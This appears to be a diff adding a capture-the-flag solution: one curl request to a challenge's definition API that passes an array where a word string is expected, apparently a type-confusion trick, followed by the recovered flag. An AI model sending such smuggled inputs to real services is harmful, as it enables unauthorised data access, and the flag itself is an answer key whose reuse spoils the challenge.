@@ -1,0 +1,3 @@
+curl 'https://words.ictf.iciaran.com/api/definition' -H 'Content-Type: application/json' --data '{"word": ["flag","x"]}'
+ictf{m0ng00s3_1mpl1c17_1n_p41n}
+
